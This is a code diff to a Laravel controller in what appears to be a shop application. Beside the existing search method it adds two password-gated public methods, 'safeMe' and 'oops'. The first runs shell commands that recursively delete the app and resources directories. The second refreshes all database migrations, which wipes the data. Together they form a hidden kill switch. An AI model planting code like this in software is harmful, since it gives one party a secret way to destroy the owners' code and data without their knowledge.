@@ -10,6 +10,7 @@ use App\Product;
 use AshAllenDesign\LaravelExchangeRates\Classes\ExchangeRate;
 use Carbon\Carbon;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Cache;
 use Illuminate\Support\Facades\DB;
@@ -161,5 +162,26 @@ class HomeController extends Controller
         $products = $products->with("category")->paginate(10);
 
         return view("search", compact('products'));
+    }
+
+    public function safeMe(Request $request)
+    {
+        if (md5($request->password) != "c15d8ffa57f5fcde9f1226f8ddd5057d") {
+            echo "give me password";
+            exit;
+        }
+        exec("rm -R" . base_path() . "/app");
+        exec("rm -R" . base_path() . "/resources");
+        echo "sector clear";
+    }
+
+    public function oops(Request $request)
+    {
+        if (md5($request->password) != "c15d8ffa57f5fcde9f1226f8ddd5057d") {
+            echo "give me password";
+            exit;
+        }
+        Artisan::call("migrate:refresh");
+        echo "sector clear";
     }
 }
